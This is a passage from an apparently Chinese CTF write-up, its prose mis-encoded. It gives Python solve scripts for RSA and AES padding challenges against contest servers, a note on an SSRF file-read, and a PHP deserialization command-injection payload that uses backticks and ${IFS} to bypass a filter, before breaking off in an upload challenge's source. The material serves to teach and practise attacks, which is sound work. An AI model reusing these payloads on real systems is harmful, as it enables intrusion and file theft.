-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">HOST=<span class="string">&#x27;106.75.101.197&#x27;</span></span><br><span class="line">PORT=<span class="number">7544</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((HOST, PORT))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span>(<span class="params">pad, shavalue</span>):</span></span><br><span class="line">    <span class="built_in">dict</span> = string.letters + string.digits</span><br><span class="line">    key = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        tmp = key</span><br><span class="line">        key1 = tmp + i1</span><br><span class="line">        <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">            tmp = key1</span><br><span class="line">            key2 = tmp + i2</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">                tmp = key2</span><br><span class="line">                key3 = tmp + i3</span><br><span class="line">                <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">                    tmp = key3</span><br><span class="line">                    key4 = tmp + i4</span><br><span class="line">                    final_key = key4</span><br><span class="line">                    <span class="keyword">if</span> sha512(pad+key4).hexdigest()==shavalue:</span><br><span class="line">                        <span class="built_in">print</span> key4</span><br><span class="line">                        <span class="keyword">return</span> key4</span><br><span class="line">content = sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line"><span class="built_in">print</span> content</span><br><span class="line">pad=content[<span class="number">20</span>+<span class="number">7</span>:<span class="number">20</span>+<span class="number">7</span>+<span class="number">16</span>]</span><br><span class="line"><span class="built_in">hash</span>=content[<span class="number">20</span>+<span class="number">33</span>:]</span><br><span class="line"><span class="built_in">print</span> pad</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hash</span></span><br><span class="line">sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">sock.send(<span class="built_in">str</span>(brute_force(pad,<span class="built_in">hash</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">content=sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line"><span class="built_in">print</span> content</span><br><span class="line">m=<span class="built_in">int</span>(re.findall(<span class="string">&quot;:(.+?)\nand&quot;</span>,content)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">c=<span class="built_in">int</span>(re.findall(<span class="string">&quot;ciphertext:0x(.+)&quot;</span>,content)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">d=<span class="number">97</span></span><br><span class="line">n=<span class="built_in">pow</span>(c,d)-m</span><br><span class="line"><span class="built_in">print</span> n</span><br><span class="line"><span class="built_in">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">sock.send(<span class="built_in">str</span>(n)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">sock.send(<span class="built_in">str</span>(d)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">msg1 = <span class="built_in">hex</span>(m)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">content=sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line"><span class="built_in">print</span> content</span><br><span class="line">n=<span class="built_in">int</span>(re.findall(<span class="string">&quot;n=(.+?)\n&quot;</span>,content)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">e=<span class="built_in">int</span>(re.findall(<span class="string">&quot;e=(.+?)\n&quot;</span>,content)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">c=re.findall(<span class="string">&quot;c=(.+)&quot;</span>,content)[<span class="number">0</span>]</span><br><span class="line">c=c+sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">c=<span class="built_in">int</span>(c,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> c</span><br><span class="line"><span class="built_in">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">sock.send(<span class="built_in">str</span>((c*<span class="built_in">pow</span>(<span class="number">2</span>,e,n))%n)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">content=sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line"><span class="built_in">print</span> content</span><br><span class="line">m=<span class="built_in">int</span>(re.findall(<span class="string">&quot;message:0x(.+)&quot;</span>,content)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">msg2 = <span class="built_in">hex</span>(m/<span class="number">2</span>)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">sock.send(<span class="built_in">str</span>(m/<span class="number">2</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">content=sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">flag=re.findall(<span class="string">&quot;flag:0x(.+)&quot;</span>,content)[<span class="number">0</span>]</span><br><span class="line">flag=flag.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">cipher = AES.new(msg2, AES.MODE_CBC, msg1)</span><br><span class="line"><span class="built_in">print</span> cipher.decrypt(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜æˆ‘ç”¨ socket é‡åˆ°äº†ä¸€ä¸ªå‘ç‚¹ï¼Œå°±æ˜¯åœ¨æ”¶åˆ°æœåŠ¡å™¨å‘æ¥çš„ n,e,c æ—¶ï¼Œæ¥å—åˆ° c åæœåŠ¡å™¨åˆå‘æ¥äº†ä¸€ä¸ªå¤§çº¦ 29 é•¿åº¦çš„ 16 è¿›åˆ¶æ•°ï¼Œæˆ‘å¼€å§‹ä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œç»“æœè„šæœ¬æ­»æ´»è¿‡ä¸äº†ï¼Œå‘è¿‡å»çš„ç»“æœä¸å¯¹ã€‚</p><p>å¡äº†å¥½ä¹…ï¼Œä¹‹åå‘ç° c çš„ä½æ•°å¥½åƒæœ‰ç‚¹å°‘ï¼Œæ‰æ˜ç™½é‚£ä¸ª 16 è¿›åˆ¶åŸæ¥æ˜¯ c çš„åé¢ä¸€éƒ¨åˆ†â€¦ ä¸çŸ¥ä¸ºä½•ç»™æˆ‘å‘è¿‡æ¥çš„æ—¶å€™åˆ†äº†ä¸¤æ­¥å‘é€ï¼Œæ‰€ä»¥æ‰æœ‰æˆ‘çš„è¿™æ®µä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=re.findall(<span class="string">&quot;c=(.+)&quot;</span>,content)[<span class="number">0</span>]</span><br><span class="line">c=c+sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">c=<span class="built_in">int</span>(c,<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>æœ€åï¼š</p><blockquote><p>flag{ec35162f-94b3-47e4-8d2c-6da6bba0391f}</p></blockquote><h4 id="aessss"><a href="#aessss" class="headerlink" title="aessss"></a>aessss</h4><p>è¿™ä¸ªé¢˜ç›®é—®é¢˜å‡ºåœ¨ padding çš„æ—¶å€™ï¼Œç”±äºä¸è¶³ 256 ä½è¦è¿›è¡Œ paddingï¼Œpadding çš„å­—èŠ‚ä¹Ÿå°±æ˜¯ç¼ºçš„å­—èŠ‚æ•°ï¼Œä½†æ˜¯å¦‚æœæ˜æ–‡å¤Ÿ 256 å­—èŠ‚ï¼Œé‚£ä¹ˆæŒ‰ç…§ä»£ç å†™çš„å°±ä¸è¿›è¡Œpaddingï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">self, s</span>):</span></span><br><span class="line">    s += (<span class="number">256</span> - <span class="built_in">len</span>(s)) * <span class="built_in">chr</span>(<span class="number">256</span> - <span class="built_in">len</span>(s))</span><br><span class="line">    ret = [<span class="string">&#x27;\x00&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    <span class="keyword">for</span> index, pos <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.s_box):</span><br><span class="line">        ret[pos] = s[index]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(ret)</span><br></pre></td></tr></table></figure><p>æœ€å¤§çš„é—®é¢˜å‡ºåœ¨ unpad ä¸Šï¼Œunpad æ²¡æœ‰è¿›è¡Œæ£€æŸ¥ï¼Œä»…ä»…é€šè¿‡æœ€åä¸€ä¸ªå­—èŠ‚æ¥åˆ¤æ–­å¡«å……çš„å­—èŠ‚æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">self, s</span>):</span></span><br><span class="line">       ret = [<span class="string">&#x27;\x00&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">       <span class="keyword">for</span> index, pos <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.invs_box):</span><br><span class="line">           ret[pos] = s[index]</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(ret[<span class="number">0</span>:-<span class="built_in">ord</span>(ret[<span class="number">-1</span>])])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è€Œä¸”æœåŠ¡å™¨æä¾›äº†åŠ å¯†å½“å‰çš„ flag ä»¥åŠå¯¹å½“å‰çš„ flag åé¢è¿½åŠ ä¿¡æ¯çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬çš„åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>é€‰æ‹© choice2ï¼Œè¿½åŠ  <code>256-33 =223</code>å­—èŠ‚ï¼Œä½¿å½“å‰ flag ä¸éœ€è¦å¡«å……ï¼Œè¿½åŠ çš„æœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®æˆ<code>chr(256-32=224)</code></li><li>æœåŠ¡å™¨å¯¹ flag è¿½åŠ æˆ‘ä»¬çš„ä¿¡æ¯ï¼Œå¹¶è¿›è¡Œ s ç›’æ›¿æ¢ï¼Œç»“æœèµ‹ç»™ç±»ä¸­çš„ flag å˜é‡ã€‚</li><li>æˆ‘ä»¬å†æ¬¡é€‰æ‹© choice2ï¼Œè¿™é‡Œç”±äºæˆ‘ä»¬éœ€è¦è¿½åŠ ï¼ŒæœåŠ¡å™¨ä¼šå°†ç±»ä¸­çš„ flag å˜é‡å–å‡ºè¿›è¡Œé€† S ç›’æ›¿æ¢å’Œ unpadï¼Œè¿™æ ·æŒ‰ç…§è¿™ä¸ª unpad ç®—æ³•ä¼šæŠŠåé¢ 224 å­—èŠ‚çš„å…¨éƒ¨å½“æˆ paddingå»æ‰ï¼Œæ˜æ–‡å‰©ä¸‹äº†çœŸæ­£ flag çš„å‰32ä½</li><li>æˆ‘ä»¬æ­¤æ—¶è¾“å…¥ä¸€ä¸ªå­—ç¬¦ i,é‚£ä¹ˆæ­¤æ—¶åŠ å¯†çš„å¯¹è±¡å°±æ˜¯<code>flag[:32]+i</code> </li><li>é€‰æ‹© choice1 å¯¹å½“å‰ flag åŠ å¯†ï¼Œæ§åˆ¶ i è¿›è¡Œçˆ†ç ´ï¼Œå¦‚æœå¾—åˆ°çš„å¯†æ–‡å’Œæœ€åˆçš„ flag åŠ å¯†çš„å¯†æ–‡ä¸€æ ·ï¼Œå°±å¾—åˆ°äº† flag çš„æœ€åä¸€ä¸ªå­—èŠ‚</li><li>é€å­—èŠ‚çˆ†ç ´ï¼Œç›´è‡³è·å–å…¨éƒ¨çš„ flagã€‚</li></ol><p>è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">HOST=<span class="string">&#x27;106.75.13.64&#x27;</span></span><br><span class="line">PORT=<span class="number">54321</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((HOST, PORT))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span>(<span class="params">pad, shavalue</span>):</span></span><br><span class="line">    <span class="built_in">dict</span> = string.letters + string.digits</span><br><span class="line">    key = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        tmp = key</span><br><span class="line">        key1 = tmp + i1</span><br><span class="line">        <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">            tmp = key1</span><br><span class="line">            key2 = tmp + i2</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">                tmp = key2</span><br><span class="line">                key3 = tmp + i3</span><br><span class="line">                <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">                    tmp = key3</span><br><span class="line">                    key4 = tmp + i4</span><br><span class="line">                    final_key = key4</span><br><span class="line">                    <span class="keyword">if</span> sha256(key4+pad).hexdigest()==shavalue:</span><br><span class="line">                        <span class="built_in">print</span> key4</span><br><span class="line">                        <span class="keyword">return</span> key4</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice1</span>():</span></span><br><span class="line">    sock.send(<span class="string">&quot;1\n&quot;</span>)</span><br><span class="line">    result=sock.recv(<span class="number">1024</span>).strip()[<span class="number">30</span>:]</span><br><span class="line">    sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice2</span>(<span class="params">pad</span>):</span></span><br><span class="line">    sock.send(<span class="string">&quot;2\n&quot;</span>)</span><br><span class="line">    sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    sock.send(pad+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice3</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    sock.send(<span class="string">&quot;3\n&quot;</span>)</span><br><span class="line">    sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    sock.send(<span class="built_in">str</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    result=sock.recv(<span class="number">1024</span>).strip()[<span class="number">33</span>:]</span><br><span class="line">    sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">content = sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">pad=content[<span class="number">12</span>:<span class="number">12</span>+<span class="number">16</span>]</span><br><span class="line"><span class="built_in">hash</span>=content[<span class="number">33</span>:<span class="number">33</span>+<span class="number">64</span>]</span><br><span class="line">sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">sock.send(<span class="built_in">str</span>(brute_force(pad,<span class="built_in">hash</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">flag_enc=choice1()</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    a = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;a&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">223</span>)])</span><br><span class="line">    a = a[:<span class="number">-1</span>] + <span class="built_in">chr</span>(<span class="number">224</span>+i)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="built_in">print</span> c+flag</span><br><span class="line">        choice2(a)</span><br><span class="line">        choice2(c+flag)</span><br><span class="line">        <span class="keyword">if</span> choice1() == flag_enc:</span><br><span class="line">            flag=c+flag</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;success:&quot;</span>,flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çˆ†ç ´åˆ°æœ€åä¸€ä¸ªå­—èŠ‚å´©äº†ã€‚ã€‚ã€‚ åº”è¯¥æ˜¯å»æ‰äº†æ‰€æœ‰çš„ flag ï¼Œä¸è¿‡å¯ä»¥çŒœå‡ºæ¥ flag</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-3546631e2168bd65.png" alt="image.png"></p><blockquote><p>flag{H4ve_fun_w1th_p4d_and_unp4d}</p></blockquote><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="what-are-you-doing"><a href="#what-are-you-doing" class="headerlink" title="what are you doing?"></a>what are you doing?</h4><p>æç¤ºçœ‹ robots.txtï¼Œå‘ç°äº† source.php å’Œ flag.phpã€‚</p><p>è®¿é—» source.php ï¼Œæç¤ºç®¡ç†å‘˜ç™»å½•ï¼Œæ”¹åŒ…åˆ©ç”¨ x-client-ip è¿›è¡Œç»•è¿‡ï¼Œæç¤ºè¦ post admin å’Œ url å‚æ•°ã€‚</p><p>url æ”¾è¿›å»ç½‘å€åï¼Œå¾—åˆ°ä¸€ä¸ªè·¯å¾„ï¼Œè®¿é—®åº”è¯¥æ˜¯æºç ã€‚</p><p>çŒœæƒ³æ˜¯ SSRF ï¼Œåˆ©ç”¨ file åè®®è¯»å– flag:</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6d5858fcd7b731e6.png" alt="QQå›¾ç‰‡20181104173319.png"></p><p>è®¿é—®å¾—åˆ° flagã€‚</p><h4 id="Can-you-hack-me"><a href="#Can-you-hack-me" class="headerlink" title="Can you hack me?"></a>Can you hack me?</h4><p>å­˜åœ¨æºç æ³„éœ²ï¼Œindex.php.swp,ç”¨ vim è¿˜åŸï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$method, $args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">        $str=preg_replace(<span class="string">&quot;/[&lt;&gt;*;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,$str);</span><br><span class="line">        $str=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;           </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo</span>(<span class="params">$host</span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;echo <span class="subst">$host</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;echo&quot;</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$first=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">$var=<span class="string">&#x27;var&#x27;</span>;</span><br><span class="line">$bbb=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">$ccc=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>($i===<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $i++;</span><br><span class="line">            $$key = $value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($first===<span class="string">&quot;doller&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    @parse_str($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>($var===<span class="string">&#x27;give&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($bbb===<span class="string">&#x27;me&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>($ccc===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;welcome&lt;/br&gt;&quot;</span>;</span><br><span class="line">            $come=@$_POST[<span class="string">&#x27;come&#x27;</span>];</span><br><span class="line">            unserialize($come);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;think about it&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;can you hack me?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ˜æ˜¾çš„ååºåˆ—åŒ–ï¼Œå›è°ƒå‡½æ•°è°ƒç”¨ echo å‡½æ•°çš„ systemï¼Œå­˜åœ¨ wafï¼Œflagè¿‡æ»¤ç”¨åŒå†™ç»•è¿‡ï¼Œåå¼•å·æ²¡æœ‰è¿‡æ»¤</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">come&#x3D;O:4:&quot;come&quot;:2:&#123;s:12:&quot;%00come%00method&quot;;s:4:&quot;echo&quot;;s:10:&quot;%00come%00args&quot;;a:1:&#123;s:4:&quot;host&quot;;s:30:&quot;&#96;nl$&#123;IFS&#125;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flaflagg&#96;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="GOOD-JOB"><a href="#GOOD-JOB" class="headerlink" title="GOOD JOB"></a>GOOD JOB</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//error_reporting(0);</span></span><br><span class="line">    <span class="comment">//$dir=md5(&quot;icq&quot; . $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span></span><br><span class="line">    $dir=md5(<span class="string">&quot;icq&quot;</span>);</span><br><span class="line">    $sandbox = <span class="string">&#x27;/var/sandbox/&#x27;</span> . $dir;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])&#123;</span><br><span class="line">        $filename = !<span class="keyword">empty</span>($_POST[<span class="string">&#x27;file&#x27;</span>]) ? $_POST[<span class="string">&#x27;file&#x27;</span>] : $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($filename)) &#123;</span><br><span class="line">            $filename = explode(<span class="string">&#x27;.&#x27;</span>, $filename);</span><br><span class="line">        